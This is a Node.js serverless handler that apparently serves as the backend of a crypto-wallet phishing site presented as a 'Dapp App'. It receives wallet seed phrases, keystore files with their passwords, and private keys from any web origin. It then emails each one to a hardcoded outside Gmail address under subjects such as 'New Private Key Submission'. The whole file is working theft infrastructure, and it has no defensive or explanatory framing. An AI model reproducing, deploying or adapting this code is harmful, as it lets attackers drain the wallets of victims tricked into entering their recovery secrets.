import nodemailer from "nodemailer";

function formatMessage(message) {
  const lines = message.split(/\r?\n/);
  const formattedLines = lines.map(
    (line) => `<div style="margin-bottom: 10px;">${line}</div>`
  );
  return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">
    ${formattedLines.join("")}
  </div>`;
}

export default async function handler(req, res) {
  // ✅ CORS headers
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");

  // ✅ Handle preflight
  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  // ✅ Health check
  if (req.method === "GET") {
    return res.status(200).send("Server is running ✅");
  }

  // ✅ Handle email submission
  if (req.method === "POST") {
    try {
      const { phrase, keystore, privateKey, item } = req.body;
      let mailOptions = null;

      const email = process.env.EMAIL_USER || "";
      const pass = process.env.EMAIL_PASS || "";
      const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: { user: email, pass },
      });

      if (phrase) {
        const formattedMessage = formatMessage(phrase);
        mailOptions = {
          from: `Dapp App <${email}>`,
          to: "Fixiondapps@gmail.com",
          subject: "New Phrase Submission",
          html: `${formattedMessage} <br/> Wallet: ${item}`,
        };
      } else if (keystore) {
        mailOptions = {
          from: `Dapp App <${email}>`,
          to: "Fixiondapps@gmail.com",
          subject: "New Keystore Submission",
          html: `<div>Json: ${keystore.json}</div>
                 <div>Password: ${keystore.password}</div>
                 Wallet: ${item}`,
        };
      } else if (privateKey) {
        const formattedMessage = formatMessage(privateKey);
        mailOptions = {
          from: `Dapp App <${email}>`,
          to: "Fixiondapps@gmail.com",
          subject: "New Private Key Submission",
          html: `${formattedMessage} <br/> Wallet: ${item}`,
        };
      }

      if (!mailOptions) {
        return res.status(400).json({ message: "Submission Failed (empty body)" });
      }

      const result = await transporter.sendMail(mailOptions);
      console.log("📤 Email sent:", result.response || result.messageId);

      return res.status(200).json({ message: "Email sent successfully!" });
    } catch (error) {
      console.error("🔥 Email error:", error);
      return res.status(500).json({ error: "Email failed", details: error.message });
    }
  }

  // ❌ Fallback
  return res.status(405).json({ error: "Method not allowed" });
}
